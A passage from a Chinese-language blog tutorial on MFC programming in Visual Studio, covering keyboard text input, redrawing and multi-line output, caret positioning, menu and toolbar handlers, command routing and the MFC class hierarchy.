tmInternalLeading;</span><br><span class="line">    LONG        tmExternalLeading;</span><br><span class="line">    LONG        tmAveCharWidth;</span><br><span class="line">    LONG        tmMaxCharWidth;</span><br><span class="line">    LONG        tmWeight;</span><br><span class="line">    LONG        tmOverhang;</span><br><span class="line">    LONG        tmDigitizedAspectX;</span><br><span class="line">    LONG        tmDigitizedAspectY;</span><br><span class="line">    WCHAR       tmFirstChar;</span><br><span class="line">    WCHAR       tmLastChar;</span><br><span class="line">    WCHAR       tmDefaultChar;</span><br><span class="line">    WCHAR       tmBreakChar;</span><br><span class="line">    BYTE        tmItalic;</span><br><span class="line">    BYTE        tmUnderlined;</span><br><span class="line">    BYTE        tmStruckOut;</span><br><span class="line">    BYTE        tmPitchAndFamily;</span><br><span class="line">    BYTE        tmCharSet;</span><br><span class="line">&#125; TEXTMETRICW, *PTEXTMETRICW, NEAR *NPTEXTMETRICW, FAR *LPTEXTMETRICW;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="keyword">typedef</span> TEXTMETRICW TEXTMETRIC;</span><br></pre></td></tr></table></figure><p>反正传入这个的目的就是为了获取到里面的hight。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CClientDC</span> : <span class="keyword">public</span> CDC</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DECLARE_DYNAMIC</span>(CClientDC)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructors</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">CClientDC</span><span class="params">(CWnd* pWnd)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attributes</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">HWND m_hWnd;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">CClientDC</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">AssertValid</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Dump</span><span class="params">(CDumpContext&amp; dc)</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>显然这个类是继承CDC的一个派生类，那么这个派生类也能拿到基类的设备上下文了。</p><p>跑起来之后反正目前看上去差别不大。</p><p>光标位置有了，就是输入的时候</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnChar</span><span class="params">(UINT nChar, UINT nRepCnt, UINT nFlags)</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnChar</span>(nChar, nRepCnt, nFlags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这玩意也比较有意思。<br>当我们在输出的地方打印这个uChar的时候</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnChar</span><span class="params">(UINT nChar, UINT nRepCnt, UINT nFlags)</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%c\r\n&quot;</span>, nChar);</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnChar</span>(nChar, nRepCnt, nFlags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/025.png" class=""><p>也就是每当键盘按下一个键，他就会接收到。既然它能接收到，那就好办了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnChar</span><span class="params">(UINT nChar, UINT nRepCnt, UINT nFlags)</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%c\r\n&quot;</span>, nChar);</span><br><span class="line"><span class="function">CClientDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">m_strText += (TCHAR)nChar;</span><br><span class="line">dc.<span class="built_in">TextOut</span>(<span class="number">0</span>, <span class="number">0</span>, m_strText);</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnChar</span>(nChar, nRepCnt, nFlags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写入肯定还是要获取设备上下文的，然后就是TextOut的最后一个参数是Cstring，在这里创建临时变量的话，也不能保证后面别的地方会不会用到，就干脆在类里面新建一个成员保存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">CPoint m_start;<span class="comment">//起始位置，用于绘制线条</span></span><br><span class="line">CPoint m_cur;<span class="comment">//当前点位，用于绘制线条</span></span><br><span class="line">CPoint m_stop;<span class="comment">//终止位置，用于绘制线条</span></span><br><span class="line">BOOL m_status;<span class="comment">//绘制状态</span></span><br><span class="line">CString m_strText;<span class="comment">//用户输出的字符串</span></span><br></pre></td></tr></table></figure><p>这里<code>m_strText += (TCHAR)nChar;</code>转换是因为vs2022反正项目默认都是unicode编码的也就是宽字节，所有的字符占两个字节，而多字节也就是ANSI，在ANSI中英文占用一个字节，所以二者会有区别。这也是有的时候要么改编码环境要么强转。</p><p>跑起来试试</p><img src="/2022/07/25/mfc01/026.png" class=""><p>可以看到还是有点问题，比如这个光标不移动，还要每次输入闪烁很明显，闪烁肯定是重绘的问题。<br>所以在重绘函数ondraw里面来一次textout就行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="function">CPen <span class="title">pen</span><span class="params">(PS_DASH, <span class="number">4</span>, RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CPen *pPen = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;pen);</span><br><span class="line"><span class="function">CBrush <span class="title">brush</span><span class="params">(RGB(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CBrush *pBrush = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;brush);</span><br><span class="line"></span><br><span class="line">LOGPEN logpen;</span><br><span class="line">pPen-&gt;<span class="built_in">GetLogPen</span>(&amp;logpen);</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;\nstyle:%d width:%d color:%08X\n&quot;</span>, logpen.lopnStyle, logpen.lopnWidth, logpen.lopnColor);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_cur), &amp;brush);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_stop), &amp;brush);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还原笔的属性是为了保证后面要画的时候不会还是这个类型</span></span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pPen);</span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pBrush);</span><br><span class="line"></span><br><span class="line"><span class="comment">//重绘字符串</span></span><br><span class="line">pDC-&gt;<span class="built_in">TextOut</span>(<span class="number">0</span>, <span class="number">0</span>, m_strText);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在onchar消息里面刷新</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnChar</span><span class="params">(UINT nChar, UINT nRepCnt, UINT nFlags)</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%c\r\n&quot;</span>, nChar);</span><br><span class="line"><span class="function">CClientDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">m_strText += (TCHAR)nChar;</span><br><span class="line">dc.<span class="built_in">TextOut</span>(<span class="number">0</span>, <span class="number">0</span>, m_strText);</span><br><span class="line"><span class="built_in">InvalidateRect</span>(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnChar</span>(nChar, nRepCnt, nFlags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>闪烁问题就解决了。</p><p><strong>另外测试的时候回车键有点问题，因为没有对\n进行处理</strong></p><p>其实这些操作都是在考虑一个消息该怎么处理</p><ol><li>要确定响应什么消息，像鼠标按下，就是lbuttondown</li><li>添加消息响应函数，快捷方式从消息中add</li><li>追加消息响应内容，默认是空的，你要给这个消息额外写一些功能</li></ol><p>其中比较麻烦的就是确定响应哪个消息，一开始肯定是不知道了只能查了。还有就是响应规则，有些会和头部预先定义的相关，有些则是全都由自己来写。</p><p>那么现在还有两个问题，一个多行文本一个光标移动。</p><p>换行这个问题其实根本在TextOut上，因为这个方法不具备换行能力。而我们又要考虑重绘的问题，就需要在OnDraw里改动。<br>最简单的就是用循环，然后if判断输入的是是否为换行，如果是就要让TextOut的y轴变大。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="function">CPen <span class="title">pen</span><span class="params">(PS_DASH, <span class="number">4</span>, RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CPen *pPen = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;pen);</span><br><span class="line"><span class="function">CBrush <span class="title">brush</span><span class="params">(RGB(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CBrush *pBrush = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;brush);</span><br><span class="line"></span><br><span class="line">LOGPEN logpen;</span><br><span class="line">pPen-&gt;<span class="built_in">GetLogPen</span>(&amp;logpen);</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;\nstyle:%d width:%d color:%08X\n&quot;</span>, logpen.lopnStyle, logpen.lopnWidth, logpen.lopnColor);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_cur), &amp;brush);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_stop), &amp;brush);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还原笔的属性是为了保证后面要画的时候不会还是这个属性的笔</span></span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pPen);</span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pBrush);</span><br><span class="line"></span><br><span class="line"><span class="comment">//重绘字符串</span></span><br><span class="line">CString sub = _T(<span class="string">&quot;&quot;</span>);<span class="comment">//用来记录要绘制的字符</span></span><br><span class="line"><span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span>; i &lt; m_strText.<span class="built_in">GetLength</span>(); i++ ) &#123;</span><br><span class="line"><span class="keyword">if</span> (( m_strText.<span class="built_in">GetAt</span>(i) == <span class="string">&#x27;\n&#x27;</span> ) || (m_strText.<span class="built_in">GetAt</span>(i) == <span class="string">&#x27;\r&#x27;</span>)) &#123;</span><br><span class="line">pDC-&gt;<span class="built_in">TextOut</span>(<span class="number">0</span>, y, sub);</span><br><span class="line">sub.<span class="built_in">Empty</span>();</span><br><span class="line">y += <span class="number">20</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">sub += m_strText.<span class="built_in">GetAt</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sub不为空就直接打印</span></span><br><span class="line"><span class="keyword">if</span> ( !sub.<span class="built_in">IsEmpty</span>() ) pDC-&gt;<span class="built_in">TextOut</span>(<span class="number">0</span>, y, sub);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/027.png" class=""><p>换行的效果实现了，这里比较坑的是<code>if (( m_strText.GetAt(i) == &#39;\n&#39; ) || (m_strText.GetAt(i) == &#39;\r&#39;))</code>获取的换行符好像会被\r顶掉，但是\n还是得保留，因为键盘输入的角度都是\r了，但是万一黏贴的文本是个\n就有点搞了。<br>不过显然是获取数据的时候有点小问题，要是不想在这if，可能就要在onchar消息里面修改掉。</p><p>最后就是光标</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="function">CPen <span class="title">pen</span><span class="params">(PS_DASH, <span class="number">4</span>, RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CPen *pPen = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;pen);</span><br><span class="line"><span class="function">CBrush <span class="title">brush</span><span class="params">(RGB(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CBrush *pBrush = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;brush);</span><br><span class="line"></span><br><span class="line">LOGPEN logpen;</span><br><span class="line">pPen-&gt;<span class="built_in">GetLogPen</span>(&amp;logpen);</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;\nstyle:%d width:%d color:%08X\n&quot;</span>, logpen.lopnStyle, logpen.lopnWidth, logpen.lopnColor);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_cur), &amp;brush);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_stop), &amp;brush);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还原笔的属性是为了保证后面要画的时候不会还是这个类型</span></span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pPen);</span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pBrush);</span><br><span class="line"></span><br><span class="line"><span class="comment">//重绘字符串</span></span><br><span class="line">CString sub = _T(<span class="string">&quot;&quot;</span>);<span class="comment">//用来记录要绘制的字符</span></span><br><span class="line"><span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span>; i &lt; m_strText.<span class="built_in">GetLength</span>(); i++ ) &#123;</span><br><span class="line"><span class="keyword">if</span> (( m_strText.<span class="built_in">GetAt</span>(i) == <span class="string">&#x27;\n&#x27;</span> ) || (m_strText.<span class="built_in">GetAt</span>(i) == <span class="string">&#x27;\r&#x27;</span>)) &#123;</span><br><span class="line">pDC-&gt;<span class="built_in">TextOut</span>(<span class="number">0</span>, y, sub);</span><br><span class="line">CSize sz = pDC-&gt;<span class="built_in">GetTextExtent</span>(sub);</span><br><span class="line">sub.<span class="built_in">Empty</span>();</span><br><span class="line"><span class="comment">//y += 20;</span></span><br><span class="line">y += sz.cy + <span class="number">2</span>;<span class="comment">//+2是为了留点行间距</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">sub += m_strText.<span class="built_in">GetAt</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//循环里面</span></span><br><span class="line"><span class="keyword">if</span> ( !sub.<span class="built_in">IsEmpty</span>() ) pDC-&gt;<span class="built_in">TextOut</span>(<span class="number">0</span>, y, sub);</span><br><span class="line"></span><br><span class="line"><span class="comment">//移动光标</span></span><br><span class="line">CPoint cp;</span><br><span class="line">CSize sz = pDC-&gt;<span class="built_in">GetTextExtent</span>(sub);</span><br><span class="line">cp.y = y;<span class="comment">//y是局部设置好的</span></span><br><span class="line">cp.x = sz.cx;<span class="comment">//通过捕捉sub，得到x和y</span></span><br><span class="line"><span class="built_in">SetCaretPos</span>(cp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>光标的y轴还算好计算的，毕竟换行的时候就会根据y改变<br>x则需要借助<code>CSize sz = pDC-&gt;GetTextExtent(sub);</code>这么一个获取设备上下文的文字范围。其中最为关键的就是cx和cy。<br>所以也修改了换行的时候y的值，但从20这个固定值，只能保证常用字符，有些汉字什么的就不能保证了，所以还是主动获取最好。</p><p><strong>要注意，换行前的xy和换行后的xy肯定是不同的，不要想着用一个CSize</strong></p><img src="/2022/07/25/mfc01/028.png" class=""><p>效果差不多了。</p><p>像玩的深入的还能这样该后面的移动光标<br><code>SetCaretPos(CPoint(sz.cx + 2, y));</code><br>一句话就该过去了，实际上也是用了父类子类之间的关系，然后就是构造函数。<br>看了老师的操作雀食不一样，还有一种调用系统api的方式<code>::SetCaretPos(sz.cx + 2, y);</code>，不过毕竟是系统api，不是mfc的直接内容，所以有的时候为了项目维护还是不搞花里胡哨的。</p><p>但是仍然有很多不足</p><ol><li>没有删除的功能</li><li>比如左键拖动选中文字，文字的背景颜色会变黑之类的</li></ol><p>这些日后再说</p><hr><h2 id="菜单和工具栏"><a href="#菜单和工具栏" class="headerlink" title="菜单和工具栏"></a>菜单和工具栏</h2><h3 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h3><img src="/2022/07/25/mfc01/029.png" class=""><p>资源视图没有的，在vs的菜单栏找到视图，再找其他窗口里面就有了。</p><p>然后就是经典设计，注意修改id，默认尾巴跟数字不利于使用和查看。然后描述文字<code>画矩形(&amp;R)</code>后面的是快捷键的一种表达方式，反正具体的应该是mfc写好了。我们只要跟着这样格式写就行。alt+你所输入的字符即为快捷键</p><img src="/2022/07/25/mfc01/030.png" class=""><p>跑起来效果肯定就没啥差别</p><img src="/2022/07/25/mfc01/031.png" class=""><p>灰色应该是没有事件处理，就是死的按钮。</p><p>然后就是给这个菜单绑定事件</p><img src="/2022/07/25/mfc01/032.png" class=""><p>类别表选择view。看下面的菜单命令路由</p><img src="/2022/07/25/mfc01/033.png" class=""><p>确定之后就会加载一个空的函数了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDrawLine</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加命令处理程序代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>TRACE(&quot;%s(%d):%s\r\n&quot;, __FILE__, __LINE__, __FUNCTION__);</code><br>这条内容主要是打印文件路径，然后行号，还有就是函数名<br>典型的debug调试时候使用。</p><p>我们把画矩形绑定事件，不同的就是类列表不同，前面那个在view下，这个在doc下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintDoc::OnDrwaRect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加命令处理程序代码</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s\r\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后run一个<br>当我们点击了这个画线和画矩形的时候，输出那里就能看到详细的文件路径、行号和函数名</p><img src="/2022/07/25/mfc01/034.png" class=""><p>有意思的是双击输出中的这一行TRACE打印的内容他会直接跳转到这个函数的位置</p><img src="/2022/07/25/mfc01/035.png" class=""><p>对于测试来说这个肯定挺好用的。</p><hr><h3 id="菜单命令路由"><a href="#菜单命令路由" class="headerlink" title="菜单命令路由"></a>菜单命令路由</h3><ol><li>有view和doc，触发了view，但是没有触发doc</li><li>去掉view类的菜单响应函数，打开doc类的响应函数。触发view类，不触发doc；view &gt; doc</li><li>去掉了doc类的菜单响应函数，打开框架类的响应函数触发doc类，不触发app；doc &gt; 框架</li><li>去掉了app类的菜单响应函数，打开app类的响应函数； 框架 &gt; app</li></ol><p>所以响应菜单的命令顺序：view &gt; doc &gt; 框架 &gt; app<br>在这个mfc程序里面看：CMFCPaintView &gt; CMFCPaintDoc &gt; CMainFrame &gt; CMFCPanitApp</p><p>测试的方式可以通过<code>TRACE(&quot;%s(%d):%s\r\n&quot;, __FILE__, __LINE__, __FUNCTION__);</code><br>在view中都绑定事件，然后在其它doc下也绑定，看看到底先触发的是view还是什么。</p><p><strong>经典MVC模式中，M是指业务模型，V是指用户界面，C则是控制器，使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表现形式。其中，View的定义比较清晰，就是用户界面。</strong></p><hr><h3 id="工具栏"><a href="#工具栏" class="headerlink" title="工具栏"></a>工具栏</h3><p>也是通过资源视图去找，找到toolbar，然后叫mainframe</p><img src="/2022/07/25/mfc01/036.png" class=""><img src="/2022/07/25/mfc01/037.png" class=""><p>下面哪个256是因为有别的颜色，但是本身都是一个东西，所以做一个东西俩都要弄</p><img src="/2022/07/25/mfc01/038.png" class=""><img src="/2022/07/25/mfc01/039.png" class=""><p>绘制完成后，修改id</p><img src="/2022/07/25/mfc01/040.png" class=""><p><strong>注意，如果这个id选择的是以前写过内容的id，那么这个工具栏的按钮就会绑定之前的内容</strong><br>比如我这个又使用<code>DRAW_LINE</code>这是之前测试的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDrawLine</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加命令处理程序代码</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s\r\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内容是这样的，我们run这个程序点击看看是否会触发</p><img src="/2022/07/25/mfc01/041.png" class=""><p>我们点击了三次，它也的确触发了三次，说明确实绑定了。</p><p><strong>删除这个工具栏的选项，要点击然后拖出去就能删掉了，默认没啥地方有删除选项</strong></p><hr><h3 id="mfc结构文档"><a href="#mfc结构文档" class="headerlink" title="mfc结构文档"></a>mfc结构文档</h3><p><a href="https://docs.microsoft.com/zh-cn/cpp/mfc/hierarchy-chart?view=msvc-170&viewFallbackFrom=2022">文档戳链接，如果有误跳转时可修改最后参数，此参数为年份</a></p><p>看层次结构的目的是为了以后当参数转换啥的更方便，像自己在vs里面不断跳转定义也ok，就是稍微麻烦了点。</p><p>层次的视觉感观会更直接，比如生物-动物-人-男人，作为派生类，总会有一些与其父类相关的特性。</p><p>CObject</p><ul><li>支持序列化<ul><li>可能把一个结构体变成一个字符串，几个字节存放一个数据，最后留俩当长度</li><li>也可能是{x:100,y:200}这样结构化，类似于json</li><li>….等都是一种序列化的表现</li></ul></li><li>支持运行时提供类的信息<ul><li><code>static CRuntimeClass *PASCAL _GetBaseClass();</code></li><li><code>static CRuntimeClass *PASCAL 